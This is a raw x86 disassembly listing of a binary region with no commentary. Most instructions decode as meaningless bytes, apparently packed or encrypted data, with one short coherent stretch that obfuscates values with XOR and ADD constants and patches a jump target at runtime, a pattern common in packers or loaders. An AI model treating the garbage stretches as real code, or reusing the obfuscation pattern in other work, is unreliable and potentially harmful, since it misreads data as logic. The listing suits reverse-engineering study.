  41fdad:	push   ebx
  41fdae:	jae    0x41fd36
  41fdb0:	push   edx
  41fdb1:	test   DWORD PTR [ebx],ecx
  41fdb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdb4:	bound  esp,QWORD PTR [esi]
  41fdb6:	inc    esp
  41fdb7:	xor    eax,0x9f99672
  41fdbc:	push   ecx
  41fdbd:	cmp    eax,0x6322f989
  41fdc2:	inc    ebx
  41fdc3:	pop    eax
  41fdc4:	mov    eax,ds:0xd1546149
  41fdc9:	push   0x75
  41fdcb:	push   0x72
  41fdcd:	mov    bh,0x83
  41fdcf:	std    
  41fdd0:	inc    BYTE PTR [edx]
  41fdd2:	pop    esi
  41fdd3:	shr    ecx,cl
  41fdd5:	mov    ecx,0x8d671725
  41fdda:	inc    eax
  41fddb:	pop    esi
  41fddc:	adc    al,0xe2
  41fdde:	in     eax,dx
  41fddf:	push   ss
  41fde0:	push   cs
  41fde1:	cwde   
  41fde2:	sub    DWORD PTR [ecx-0x5615bb9c],ebp
  41fde8:	fucom  st(1)
  41fdea:	cld    
  41fdeb:	ins    BYTE PTR es:[edi],dx
  41fdec:	sub    ecx,DWORD PTR [ecx]
  41fdee:	xchg   edx,eax
  41fdef:	cdq    
  41fdf0:	and    al,0xb4
  41fdf2:	or     ch,BYTE PTR [ebx]
  41fdf4:	mov    BYTE PTR [esi-0x37],0xe8
  41fdf8:	pop    edx
  41fdf9:	or     eax,0xb0668671
  41fdfe:	sbb    al,0x69
  41fe00:	inc    ecx
  41fe01:	xchg   cx,ax
  41fe03:	xchg   ebx,eax
  41fe04:	pop    ebp
  41fe05:	clc    
  41fe06:	mov    eax,ds:0x918dc44
  41fe0b:	pop    ebp
  41fe0c:	repnz pop edi
  41fe0e:	cmc    
  41fe0f:	scas   al,BYTE PTR es:[edi]
  41fe10:	inc    DWORD PTR [edx-0x180fe77b]
  41fe16:	ins    DWORD PTR es:[edi],dx
  41fe17:	pushf  
  41fe18:	add    eax,0xeca9dc5a
  41fe1d:	ja     0x41fe15
  41fe1f:	daa    
  41fe20:	and    edx,DWORD PTR [eax]
  41fe22:	adc    BYTE PTR [ebp-0x1f],al
  41fe25:	pop    ds
  41fe26:	pop    es
  41fe27:	cdq    
  41fe28:	std    
  41fe29:	repnz and BYTE PTR [edi+0x7c],ch
  41fe2d:	ins    DWORD PTR es:[edi],dx
  41fe2e:	pusha  
  41fe2f:	lds    ecx,FWORD PTR [ebx]
  41fe31:	or     ebx,ebp
  41fe33:	jmp    0x41fe22
  41fe35:	inc    ebp
  41fe36:	xchg   DWORD PTR [edi],ebx
  41fe38:	mov    BYTE PTR ds:0x591e87a1,bl
  41fe3e:	test   ah,bl
  41fe40:	cdq    
  41fe41:	in     eax,0xf2
  41fe43:	nop
  41fe44:	call   0x8486:0x2d390838
  41fe4b:	jg     0x41fe70
  41fe4d:	and    eax,0x951192c6
  41fe52:	cmp    ecx,eax
  41fe54:	inc    ecx
  41fe55:	or     eax,0x42a1a78c
  41fe5a:	rcl    BYTE PTR [eax-0x4e6e7956],cl
  41fe60:	(bad)  
  41fe61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe62:	jne    0x41fe59
  41fe64:	push   ss
  41fe65:	fld    TBYTE PTR [edx]
  41fe67:	xchg   ebx,eax
  41fe68:	dec    edx
  41fe69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe6a:	loope  0x41fe26
  41fe6c:	jp     0x41fe2b
  41fe6e:	outs   dx,BYTE PTR ds:[esi]
  41fe6f:	adc    cl,BYTE PTR [esp+edi*8]
  41fe72:	jae    0x41fed6
  41fe74:	test   eax,0x8984b884
  41fe79:	add    DWORD PTR [esi],eax
  41fe7b:	mov    ds:0xd412595d,al
  41fe80:	cmp    bl,BYTE PTR [eax+eax*8]
  41fe83:	retf   0x9692
  41fe86:	cvttps2pi mm0,QWORD PTR [ebx+0x19]
  41fe8a:	out    dx,al
  41fe8b:	dec    BYTE PTR [ecx]
  41fe8d:	ret    
  41fe8e:	inc    ecx
  41fe8f:	shl    DWORD PTR [ebp+0x16c69ee8],0x8b
  41fe96:	push   DWORD PTR [edi-0x13]
  41fe99:	outs   dx,DWORD PTR ds:[esi]
  41fe9a:	fimul  DWORD PTR [ebp-0x23]
  41fe9d:	test   DWORD PTR [esi],esi
  41fe9f:	stos   DWORD PTR es:[edi],eax
  41fea0:	push   cs
  41fea1:	inc    ecx
  41fea2:	aas    
  41fea3:	out    0xff,al
  41fea5:	(bad)  
  41fea6:	pop    ebx
  41fea7:	mov    bl,0x3c
  41fea9:	aam    0x62
  41feab:	adc    ch,BYTE PTR [edx-0x5d0fbadd]
  41feb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41feb2:	xchg   DWORD PTR [ecx-0x99f16cf],ecx
  41feb8:	push   eax
  41feb9:	lds    edx,FWORD PTR [ebx-0x7f]
  41febc:	and    eax,0x22f39f55
  41fec1:	xor    dl,ah
  41fec3:	pop    edi
  41fec4:	call   0x30103d6f
  41fec9:	sar    DWORD PTR [ecx],0x83
  41fecc:	rol    ebp,0x9
  41fecf:	stos   DWORD PTR es:[edi],eax
  41fed0:	or     al,0x10
  41fed2:	outs   dx,BYTE PTR ds:[esi]
  41fed3:	cli    
  41fed4:	xor    al,0x52
  41fed6:	inc    ebx
  41fed7:	loopne 0x41ff47
  41fed9:	scas   eax,DWORD PTR es:[edi]
  41feda:	scas   eax,DWORD PTR es:[edi]
  41fedb:	outs   dx,BYTE PTR ds:[esi]
  41fedc:	sub    ch,dh
  41fede:	scas   al,BYTE PTR es:[edi]
  41fedf:	(bad)
  41fee2:	cmp    esp,DWORD PTR [ebp-0x69]
  41fee5:	jne    0x41fef1
  41fee7:	retf   0x91d3
  41feea:	jb     0x41ff3d
  41feec:	xchg   ebx,eax
  41feed:	in     al,dx
  41feee:	xor    eax,0xd478a365
  41fef3:	dec    ebx
  41fef4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fef5:	outs   dx,BYTE PTR ds:[esi]
  41fef6:	and    BYTE PTR [edi+ecx*4+0x2d14d2f],dl
  41fefd:	xor    eax,0xdc636f22
  41ff02:	jge    0x41fea0
  41ff04:	jne    0x41fe8d
  41ff06:	fcmovb st,st(6)
  41ff08:	cmp    BYTE PTR [esi-0x11],bh
  41ff0b:	jmp    0x7c82:0x9de9b008
  41ff12:	ja     0x41feaf
  41ff14:	mul    DWORD PTR [edi]
  41ff16:	adc    cl,BYTE PTR [edx-0x5e]
  41ff19:	fcmove st,st(2)
  41ff1b:	(bad)  
  41ff1c:	pop    ebx
  41ff1d:	pop    edx
  41ff1e:	clc    
  41ff1f:	(bad)  
  41ff20:	jmp    0x41ff1a
  41ff22:	scas   eax,DWORD PTR es:[edi]
  41ff23:	ficom  DWORD PTR [ebx]
  41ff25:	push   cs
  41ff26:	sbb    BYTE PTR [esp+eiz*8-0x50d138d4],dh
  41ff2d:	add    esp,DWORD PTR [edx]
  41ff2f:	pop    eax
  41ff30:	add    dl,dl
  41ff32:	js     0x41ff93
  41ff34:	cmp    eax,0xc8a03bcd
  41ff39:	dec    ebx
  41ff3a:	call   0xa4df:0xd0adf49e
  41ff41:	gs mov ah,0x96
  41ff44:	bound  esi,QWORD PTR [ebx]
  41ff46:	cmp    DWORD PTR [ebx],eax
  41ff48:	pop    edi
  41ff49:	jg     0x41ff7f
  41ff4b:	das    
  41ff4c:	pop    edx
  41ff4d:	push   edi
  41ff4e:	inc    edx
  41ff4f:	cmp    edi,0x14d53e40
  41ff55:	inc    esp
  41ff56:	lds    esi,FWORD PTR [edi]
  41ff58:	push   0x9d4bf16d
  41ff5d:	mov    edi,0x72c5d716
  41ff62:	dec    esp
  41ff63:	call   0xf847:0xf19ae2a6
  41ff6a:	xor    BYTE PTR [esi-0x70f33859],cl
  41ff70:	inc    ebp
  41ff71:	outs   dx,DWORD PTR ds:[esi]
  41ff72:	aaa    
  41ff73:	pop    edi
  41ff74:	inc    edi
  41ff75:	dec    esi
  41ff76:	xchg   edx,eax
  41ff77:	shl    BYTE PTR [ebx+0x556e657d],cl
  41ff7d:	mov    al,0x9
  41ff7f:	das    
  41ff80:	pop    ecx
  41ff81:	cli    
  41ff82:	and    bl,BYTE PTR [ecx+0x80a6270]
  41ff88:	jmp    0x971e21d
  41ff8d:	aas    
  41ff8e:	push   ds
  41ff8f:	jnp    0x41ff45
  41ff91:	pop    eax
  41ff92:	push   edx
  41ff93:	imul   edi,DWORD PTR [eax+ebp*4],0x2058ec06
  41ff9a:	lahf   
  41ff9b:	retf   
  41ff9c:	nop    ebx
  41ff9f:	mov    ds:0xc9f21451,eax
  41ffa4:	push   cs
  41ffa5:	fsubr  DWORD PTR [ebx]
  41ffa7:	mov    WORD PTR [esi-0x64],fs
  41ffaa:	xchg   DWORD PTR [esi-0x3567afdf],ebp
  41ffb0:	cmc    
  41ffb1:	cmp    dh,BYTE PTR [ecx-0x691d8de3]
  41ffb7:	push   ecx
  41ffb8:	addr16 push 0xed6815da
  41ffbe:	(bad)  [edi+0x20d9ef0e]
  41ffc4:	lods   eax,DWORD PTR ds:[esi]
  41ffc5:	sti    
  41ffc6:	test   eax,0xa3665fdd
  41ffcb:	pop    edi
  41ffcc:	in     al,0x9c
  41ffce:	sbb    bh,cl
  41ffd0:	pushf  
  41ffd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffd2:	jmp    0x699664c7
  41ffd7:	dec    edi
  41ffd8:	cmp    BYTE PTR [esi],bl
  41ffda:	js     0x420039
  41ffdc:	xchg   edx,eax
  41ffdd:	neg    BYTE PTR [edi]
  41ffdf:	mov    bl,BYTE PTR [eax*8+0x74c431c4]
  41ffe6:	mov    ecx,0x1e092683
  41ffeb:	outs   dx,BYTE PTR ds:[esi]
  41ffec:	or     DWORD PTR [eax+0x3203b8e0],eax
  41fff2:	sub    DWORD PTR [esi-0x4e2fe485],edx
  41fff8:	jb     0x420039
  41fffa:	mov    ecx,DWORD PTR [ebp-0x18]
  41fffd:	sub    eax,ecx
  41ffff:	mov    DWORD PTR [ebp-0x18],eax
  420002:	or     DWORD PTR [ebp-0x18],0xf89f05a5
  420009:	mov    eax,DWORD PTR [ebp-0xc]
  42000c:	mov    ecx,DWORD PTR [ebp-0xc]
  42000f:	sub    eax,ecx
  420011:	mov    DWORD PTR [ebp-0xc],eax
  420014:	or     DWORD PTR [ebp-0xc],0xf89c85e5
  42001b:	mov    eax,DWORD PTR [ebp-0x1c]
  42001e:	mov    ecx,DWORD PTR [ebp-0x1c]
  420021:	sub    eax,ecx
  420023:	mov    DWORD PTR [ebp-0x1c],eax
  420026:	or     DWORD PTR [ebp-0x1c],0xf89c8585
  42002d:	mov    eax,DWORD PTR [ebp-0x20]
  420030:	mov    ecx,DWORD PTR [ebp-0x20]
  420033:	sub    eax,ecx
  420035:	mov    DWORD PTR [ebp-0x20],eax
  420038:	mov    eax,DWORD PTR [ebp-0x2c]
  42003b:	mov    ecx,DWORD PTR [ebp-0x20]
  42003e:	mov    esi,0x75108ae
  420043:	xor    eax,esi
  420045:	mov    edi,0x3272f5
  42004a:	add    eax,edi
  42004c:	or     eax,ecx
  42004e:	mov    DWORD PTR [ebp-0x20],eax
  420051:	mov    eax,DWORD PTR [ebp-0x4]
  420054:	mov    ecx,DWORD PTR [ebp-0x4]
  420057:	sub    eax,ecx
  420059:	mov    DWORD PTR [ebp-0x4],eax
  42005c:	or     DWORD PTR [ebp-0x4],0xf89c85be
  420063:	mov    eax,DWORD PTR [ebp-0xc]
  420066:	xor    eax,esi
  420068:	add    eax,edi
  42006a:	push   eax
  42006b:	mov    eax,DWORD PTR [ebp-0x10]
  42006e:	xor    eax,esi
  420070:	add    eax,edi
  420072:	push   eax
  420073:	mov    eax,DWORD PTR [ebp-0x4]
  420076:	xor    eax,esi
  420078:	add    eax,edi
  42007a:	push   eax
  42007b:	lea    eax,[ebp-0x78]
  42007e:	push   eax
  42007f:	push   DWORD PTR [ebp-0x2c]
  420082:	push   DWORD PTR [ebp-0x28]
  420085:	call   0x40f76f
  42008a:	test   eax,eax
  42008c:	je     0x4200ba
  420092:	lea    eax,[ebp-0x78]
  420095:	push   eax
  420096:	mov    eax,DWORD PTR [ebp-0x28]
  420099:	xor    eax,esi
  42009b:	add    eax,edi
  42009d:	push   eax
  42009e:	mov    eax,DWORD PTR [ebp-0x24]
  4200a1:	add    eax,0xaa
  4200a6:	push   eax
  4200a7:	mov    eax,DWORD PTR [ebp-0x24]
  4200aa:	mov    eax,DWORD PTR [eax+0x198]
  4200b0:	push   DWORD PTR [eax]
  4200b2:	call   0x4061fa
  4200b7:	mov    DWORD PTR [ebp-0x14],eax
  4200ba:	mov    ecx,DWORD PTR ds:0x42a56a
  4200c0:	lea    eax,[ebp+0x4]
  4200c3:	mov    DWORD PTR [ecx*4+0x42a562],eax
  4200ca:	inc    DWORD PTR ds:0x42a56a
  4200d0:	mov    eax,DWORD PTR [ebp-0x14]
  4200d3:	test   eax,eax
  4200d5:	je     0x4224ce
  4200db:	lea    eax,[ebp-0x8]
  4200de:	mov    DWORD PTR [ebp-0x34],eax
  4200e1:	mov    eax,DWORD PTR [ebp-0x30]
  4200e4:	mov    DWORD PTR [ebp-0x8],eax
  4200e7:	mov    eax,DWORD PTR [ebp-0x8]
  4200ea:	mov    ecx,DWORD PTR [ebp-0x14]
  4200ed:	sub    eax,ecx
  4200ef:	mov    DWORD PTR [ebp-0x8],eax
  4200f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4200f5:	xor    ecx,esi
  4200f7:	mov    eax,0xffcd8d0b
  4200fc:	sub    eax,ecx
  4200fe:	add    DWORD PTR [ebp-0x8],eax
  420101:	mov    eax,DWORD PTR [ebp-0x8]
  420104:	mov    ecx,DWORD PTR [ebp-0x14]
  420107:	mov    DWORD PTR [ecx+0x1],eax
  42010a:	mov    eax,DWORD PTR [ebp-0x14]
  42010d:	jmp    0x42249e
  420112:	adc    ebp,DWORD PTR [ebx]
  420114:	inc    BYTE PTR [eax-0x2a]
  420117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420118:	xchg   ecx,eax
  420119:	or     dh,bh
  42011b:	lahf   
  42011c:	cmp    eax,0x3875ae0a
  420121:	mov    eax,DWORD PTR [esi]
  420123:	mov    dh,0x80
  420125:	or     DWORD PTR [edi],0x5e
  420128:	add    DWORD PTR [ebx-0x56029d43],0x44
  42012f:	aas    
  420130:	or     eax,0xa900b82
  420135:	outs   dx,DWORD PTR ds:[esi]
  420136:	mov    ah,0x35
  420138:	lods   al,BYTE PTR ds:[esi]
  420139:	std    
  42013a:	cmp    dh,BYTE PTR [ebx]
  42013c:	jp     0x42012d
  42013e:	add    DWORD PTR [eax+edx*4-0x142c20c2],edi
  420145:	fist   DWORD PTR [eax-0x3]
  420148:	sub    edx,DWORD PTR [ebp+0x5d1e8760]
  42014e:	jno    0x4200d9
  420150:	sar    ecx,0xd5
  420153:	out    dx,al
  420154:	or     BYTE PTR [edx+0x1e],ch
  420157:	xor    edi,edi
  420159:	push   ecx
  42015a:	js     0x420111
  42015c:	jae    0x4201a6
  42015e:	inc    ebp
  42015f:	(bad)  
  420160:	pop    ebx
  420161:	pushf  
  420162:	xchg   ebx,eax
  420163:	mov    ebx,DWORD PTR [esi+0x69]
  420166:	call   0x367fc82d
  42016b:	fs mov dh,0x39
  42016e:	iret   
  42016f:	push   ss
  420170:	or     al,0x79
  420172:	xchg   DWORD PTR [ebp+edi*8+0x50],eax
  420176:	scas   eax,DWORD PTR es:[edi]
  420177:	sub    eax,0x6ee7ff53
  42017c:	xchg   edx,eax
  42017d:	mov    dh,0x80
  42017f:	enter  0x16b8,0xbc
  420183:	addr16 pop ss
  420185:	sbb    eax,0x45fd8307
  42018a:	lds    edx,FWORD PTR [esi+0x35]
  42018d:	pop    eax
  42018e:	out    0xb1,al
  420190:	and    al,0x79
  420192:	les    edx,FWORD PTR [eax-0xad3c402]
  420198:	lea    edx,[ebx-0x502d9a0c]
  42019e:	inc    ebx
  42019f:	mov    esp,0x17504082
  4201a4:	adc    al,0xf4
  4201a6:	pop    esi
  4201a7:	stos   BYTE PTR es:[edi],al
  4201a8:	inc    edi
  4201a9:	xor    esi,DWORD PTR [ebx]
  4201ab:	push   0xcbf1d4d1
  4201b0:	sahf   
  4201b1:	add    al,0x77
  4201b3:	xchg   esp,eax
  4201b4:	jmp    0xa898d81c
  4201b9:	mov    ah,BYTE PTR [ecx-0x66]
  4201bc:	rol    DWORD PTR [edx],0xc6
  4201bf:	xor    eax,0x9199108b
  4201c4:	inc    ecx
  4201c5:	mov    dh,0x1
  4201c7:	sub    ecx,DWORD PTR [edx-0xf]
  4201ca:	push   ss
  4201cb:	dec    edi
  4201cc:	xchg   ch,ah
  4201ce:	mov    BYTE PTR [esi+0x15203d89],dh
  4201d4:	inc    ebp
  4201d5:	cmp    eax,0xfafaa3d1
  4201da:	jg     0x42022e
  4201dc:	scas   al,BYTE PTR es:[edi]
  4201dd:	stos   DWORD PTR es:[edi],eax
  4201de:	sbb    al,0x70
  4201e0:	call   0xc19ffff3
  4201e5:	(bad)  
  4201e6:	out    dx,eax
  4201e7:	repz xor BYTE PTR [esi],ah
  4201ea:	xlat   BYTE PTR ds:[ebx]
  4201eb:	jecxz  0x42019f
  4201ed:	xchg   esp,eax
  4201ee:	outs   dx,BYTE PTR ds:[esi]
  4201ef:	cdq    
  4201f0:	aas    
  4201f1:	sub    BYTE PTR [edx+0x2f],bh
  4201f4:	inc    esi
  4201f5:	push   0xc5689f9e
  4201fa:	into   
  4201fb:	in     al,0xa9
  4201fd:	daa    
  4201fe:	xchg   ebp,eax
  4201ff:	add    eax,0x98b5a322
  420204:	and    al,0x57
  420206:	sahf   
  420207:	push   edx
  420208:	push   ebp
  420209:	jnp    0x4201e7
  42020b:	xchg   eax,ebx
  42020d:	pop    eax
  42020e:	sbb    dl,BYTE PTR [ebp-0x608341a2]
  420214:	mov    dh,0x61
  420216:	xor    DWORD PTR [eax],ebp
  420218:	pop    ecx
  420219:	bound  ebx,QWORD PTR [ecx+ebx*1+0x34]
  42021d:	(bad)  
  42021e:	fdivr  DWORD PTR [ecx]
  420220:	mov    ds:0x7f1ddcfb,eax
  420225:	jecxz  0x420276
  420227:	clc    
  420228:	leave  
  420229:	xchg   edi,eax
  42022a:	jo     0x420270
  42022c:	daa    
  42022d:	stos   BYTE PTR es:[edi],al
  42022e:	jno    0x4201cf
  420230:	mov    bh,0x5b
  420232:	push   DWORD PTR [di]
  420235:	or     al,BYTE PTR [edi+edx*4+0x4287d85e]
  42023c:	sub    DWORD PTR [ebx-0x2900718c],ebx
  420242:	out    dx,eax
  420243:	clc    
  420244:	sub    edi,DWORD PTR [ebx-0x45]
  420247:	pop    ecx
  420248:	je     0x420215
  42024a:	xor    BYTE PTR cs:[edi+ebx*1],bh
  42024e:	mov    esp,0xbf306d50
  420253:	mov    edx,0x40235026
  420258:	jp     0x4202c0
  42025a:	test   bh,bl
  42025c:	mov    al,ds:0x58da666b
  420261:	ja     0x420262
  420263:	cs dec ebx
  420265:	sub    BYTE PTR [eax+0xf],dh
  420268:	(bad)  
  420269:	imul   esp,DWORD PTR [edi-0x1c36300d],0x94440b4f
  420273:	cwde   
  420274:	outs   dx,DWORD PTR ds:[esi]
  420275:	cmp    eax,0x650e61c8
  42027a:	or     eax,0x1ec0b843
  42027f:	xchg   ecx,eax
  420280:	pop    ebp
  420281:	mov    ds:0x76e5ee7,al
  420286:	ins    DWORD PTR es:[edi],dx
  420287:	push   esp
  420288:	test   BYTE PTR [eax+0xd],dh
  42028b:	mov    cl,0xbd
  42028d:	add    eax,0x301f62a2
  420292:	adc    bl,BYTE PTR [eax-0x5db6ac3a]
  420298:	outs   dx,BYTE PTR ds:[esi]
  420299:	in     al,0xd9
  42029b:	clc    
  42029c:	cmp    BYTE PTR [ebp-0x4a],bl
  42029f:	adc    eax,0xf7a5b4b3
  4202a4:	popa   
  4202a5:	hlt    
  4202a6:	(bad)  
  4202a7:	dec    edx
  4202a8:	sahf   
  4202a9:	add    DWORD PTR [esi-0x13],ebx
  4202ac:	popa   
  4202ad:	dec    esi
  4202ae:	pop    ebp
  4202af:	popa   
  4202b0:	add    al,0xc0
  4202b2:	xchg   ebp,eax
  4202b3:	add    al,0xc2
  4202b5:	fisubr WORD PTR [edx]
  4202b7:	mov    bl,0xa3
  4202b9:	xchg   esp,eax
  4202ba:	outs   dx,BYTE PTR ds:[esi]
  4202bb:	repz pop ebx
  4202bd:	jo     0x420268
  4202bf:	mov    esp,0x2b38b234
  4202c4:	mov    ebp,0xfb3ffb2b
  4202c9:	out    0x9b,al
  4202cb:	jge    0x420298
  4202cd:	aaa    
  4202ce:	mov    dl,0x33
  4202d0:	dec    esi
  4202d1:	adc    ebx,DWORD PTR [edi]
  4202d3:	adc    ebp,DWORD PTR [ebp+0x73]
  4202d6:	jnp    0x4202fc
  4202d8:	enter  0x5cfc,0xb6
  4202dc:	int    0xcf
  4202de:	inc    edi
  4202df:	shl    BYTE PTR [eax+0x21009b3a],cl
  4202e5:	push   esp
  4202e6:	aad    0xff
  4202e8:	daa    
  4202e9:	pop    eax
  4202ea:	bound  eax,QWORD PTR [eax]
  4202ec:	std    
  4202ed:	fidivr WORD PTR [ecx]
  4202ef:	add    ebx,ecx
  4202f1:	loope  0x4202a8
  4202f3:	div    BYTE PTR [edx]
  4202f5:	(bad)  
  4202f6:	xchg   BYTE PTR [ecx*8-0x4b6c03df],dl
  4202fd:	lahf   
  4202fe:	fiadd  WORD PTR [ebx+0x5d]
  420301:	fld    TBYTE PTR [eax+0x2f]
  420304:	or     al,0x7b
  420306:	outs   dx,BYTE PTR ds:[esi]
  420307:	loop   0x420359
  420309:	fidiv  DWORD PTR [ecx+edi*1-0xd666dc2]
  420310:	sub    bl,BYTE PTR [edi-0x5a369ba4]
  420316:	lds    ecx,FWORD PTR [edx]
  420318:	aam    0x4d
  42031a:	jp     0x420302
  42031c:	popf   
  42031d:	pop    ss
  42031e:	stos   DWORD PTR es:[edi],eax
  42031f:	dec    eax
  420320:	add    edx,DWORD PTR [edx]
  420322:	test   al,0xb0
  420324:	imul   DWORD PTR [esi]
  420326:	(bad)  
  420327:	or     DWORD PTR [edx-0x9e43ead],eax
  42032d:	ret    
  42032e:	clc    
  42032f:	jae    0x4202e2
  420331:	jb     0x42035f
  420333:	add    al,ah
  420335:	retf   0xa02f
  420338:	jae    0x4202be
  42033a:	lods   al,BYTE PTR ds:[esi]
  42033b:	cwde   
  42033c:	test   edx,ebx
  42033e:	call   DWORD PTR [edx+0x4b]
  420341:	out    dx,eax
  420342:	sti    
  420343:	adc    eax,0xe368d443
  420348:	cmc    
  420349:	cmp    al,BYTE PTR [ecx-0x5c]
  42034c:	cdq    
  42034d:	imul   eax,ebp,0xa2dcdc17
  420353:	pusha  
  420354:	lods   al,BYTE PTR ds:[esi]
  420355:	jmp    0x91bec11f
  42035a:	inc    esi
  42035b:	jle    0x420346
  42035d:	ror    ch,1
  42035f:	mov    ebx,0xb88545f6
  420364:	pop    edx
  420365:	stos   DWORD PTR es:[edi],eax
  420366:	fcomip st,st(6)
  420368:	inc    DWORD PTR [ecx+0x41bef846]
  42036e:	(bad)  
  42036f:	jle    0x420354
  420371:	xchg   ebp,eax
  420372:	cwde   
  420373:	(bad)  
  420374:	in     eax,dx
  420375:	imul   ecx,DWORD PTR [edx],0x7
  420378:	lock icebp 
  42037a:	mov    bl,bl
  42037c:	packssdw mm6,QWORD PTR [esi+0x2]
  420380:	sbb    BYTE PTR [ebp+0x76],bh
  420383:	inc    eax
  420384:	pop    ebx
  420385:	cdq    
  420386:	or     ebp,DWORD PTR [edx+0x51]
  420389:	out    0x5,eax
  42038b:	lahf   
  42038c:	stos   BYTE PTR es:[edi],al
  42038d:	dec    edi
  42038e:	add    al,0xa4
  420390:	jo     0x420335
  420392:	xchg   esi,eax
  420393:	in     eax,dx
  420394:	les    eax,FWORD PTR [esi]
  420396:	call   0x1a14151b
  42039b:	xlat   BYTE PTR ds:[ebx]
  42039c:	adc    eax,0x66857ce6
  4203a1:	push   0x6b
  4203a3:	xchg   esp,eax
  4203a4:	int3   
  4203a5:	push   edi
  4203a6:	call   DWORD PTR [esi+edi*1+0x44]
  4203aa:	popa   
  4203ab:	les    ebp,FWORD PTR [esi]
  4203ad:	(bad)  
  4203ae:	loop   0x42037d
  4203b0:	jae    0x4203ad
  4203b2:	aad    0x5
  4203b4:	push   ss
  4203b5:	push   0x7632fb27
  4203ba:	popf   
  4203bb:	add    al,cl
  4203bd:	and    DWORD PTR [esi-0x5a529b7d],ecx
  4203c3:	xchg   edx,eax
  4203c4:	scas   eax,DWORD PTR es:[edi]
  4203c5:	scas   eax,DWORD PTR es:[edi]
  4203c6:	jns    0x420392
  4203c8:	arpl   WORD PTR [edx+0x5f],ax
  4203cb:	sbb    al,0x31
  4203cd:	addr16 dec edx
  4203cf:	add    al,0x61
  4203d1:	push   0xb3fde499
  4203d6:	jno    0x42038c
  4203d8:	test   BYTE PTR [eax+0x6f],dl
  4203db:	aaa    
  4203dc:	jle    0x420447
  4203de:	test   DWORD PTR [eax],edx
  4203e0:	jge    0x420420
  4203e2:	mov    ss,WORD PTR [eax-0x47aa80b]
  4203e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203e9:	repz mov esp,0x1db529c
  4203ef:	xor    al,0xa6
  4203f1:	mov    ?,WORD PTR [ebx-0x45ceee8]
  4203f7:	cld    
  4203f8:	dec    eax
  4203f9:	xchg   ebp,eax
  4203fa:	loope  0x42039c
  4203fc:	xor    esi,DWORD PTR [edi+edi*2+0x33]
  420400:	xor    ch,ch
  420402:	fidiv  DWORD PTR [edi]
  420404:	mov    ecx,DWORD PTR [ecx]
  420406:	int3   
  420407:	mov    cl,0x91
  420409:	inc    esi
  42040a:	popf   
  42040b:	mov    dl,0xf1
  42040d:	cmc    
  42040e:	repz pop ss
  420410:	push   esp
  420411:	xchg   esp,eax
  420412:	loope  0x42042a
  420414:	mov    al,0x2a
  420416:	inc    ecx
  420417:	js     0x4203c3
  420419:	dec    eax
  42041a:	inc    edx
  42041b:	test   al,0x6b
  42041d:	xchg   ecx,eax
  42041e:	gs adc eax,0xe80e18c0
  420424:	js     0x420431
  420426:	dec    esi
  420427:	loopne 0x420468
  420429:	out    dx,eax
  42042a:	jmp    0xfcd6:0xfc095ae3
  420431:	bound  ebx,QWORD PTR ds:0x79f66c57
  420437:	cmp    edi,DWORD PTR [eax+0x58]
  42043a:	daa    
  42043b:	jns    0x420450
  42043d:	popa   
  42043e:	stos   BYTE PTR es:[edi],al
  42043f:	jge    0x420461
  420441:	int    0x61
  420443:	pop    es
  420444:	add    ecx,ebx
  420446:	push   ebx
  420447:	sbb    BYTE PTR [eax-0x15bfdc6],ah
  42044d:	xchg   edi,eax
  42044e:	fwait
  42044f:	sbb    DWORD PTR [eax+0x52f75771],edx
  420455:	jae    0x42041a
  420457:	(bad)  
  420458:	(bad)  [edx+ecx*8-0x4644087b]
  42045f:	not    DWORD PTR [edx+ecx*1]
  420462:	or     ebx,0xffffffd8
  420465:	push   ebp
  420466:	jmp    0xfd80:0xc115ce57
  42046d:	inc    eax
  42046e:	push   ebx
  42046f:	int3   
  420470:	gs clc 
  420472:	iret   
  420473:	jg     0x4204d7
  420475:	daa    
  420476:	sub    BYTE PTR [ebx+0xd],bl
  420479:	xchg   esp,eax
  42047a:	mov    bl,0x8f
  42047c:	add    eax,0x618680
  420481:	jmp    0x7bf2360
  420486:	jmp    0x4204b2
  420488:	jb     0x4204b1
  42048a:	xor    al,0x80
  42048c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42048d:	dec    ebp
  42048e:	pushf  
  42048f:	and    esp,DWORD PTR [ebp+0x8]
  420492:	das    
  420493:	ss out 0xb,al
  420496:	(bad)  
  420498:	or     BYTE PTR [ebx-0x3b],bl
  42049b:	out    0x52,eax
  42049d:	jae    0x420518
  42049f:	(bad)  
  4204a0:	mov    al,ds:0xfad70af4
  4204a5:	sbb    BYTE PTR [ebx-0x263c3363],bl
  4204ab:	dec    edi
  4204ac:	in     eax,0x99
  4204ae:	push   edx
  4204af:	pop    edx
  4204b0:	ret    0x67b
  4204b3:	out    dx,al
  4204b4:	pop    esp
  4204b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204b6:	rcl    DWORD PTR [edi+0x6213602b],1
  4204bc:	mov    esi,0xafcc52a3
  4204c1:	mov    al,0x8f
  4204c3:	cwde   
  4204c4:	and    eax,0xf83c44a9
  4204c9:	xor    eax,0x87fb0100
  4204ce:	jae    0x42050e
  4204d0:	jne    0x420520
  4204d2:	xor    bh,BYTE PTR [edi+0x78086389]
  4204d8:	clc    
  4204d9:	inc    esp
  4204db:	fisubr DWORD PTR [edx]
  4204dd:	ds pop es
  4204df:	sub    al,BYTE PTR [edx]
  4204e1:	pop    ebp
  4204e2:	out    dx,al
  4204e3:	inc    esi
  4204e4:	das    
  4204e5:	enter  0x10af,0x13
  4204e9:	rol    BYTE PTR [ecx-0x24],cl
  4204ec:	icebp  
  4204ed:	adc    DWORD PTR [ecx+0xac95d3d],0x27
  4204f4:	adc    cl,BYTE PTR [esi-0x6b]
  4204f7:	inc    ebp
  4204f8:	push   edx
  4204f9:	pop    ebx
  4204fa:	inc    edi
  4204fb:	sbb    DWORD PTR [ebx+0x69e58958],eax
  420501:	imul   ebp,DWORD PTR [esi-0x1578b697],0x90588cf8
  42050b:	jmp    0x42052a
  42050d:	scas   al,BYTE PTR es:[edi]
  42050e:	jecxz  0x4204a4
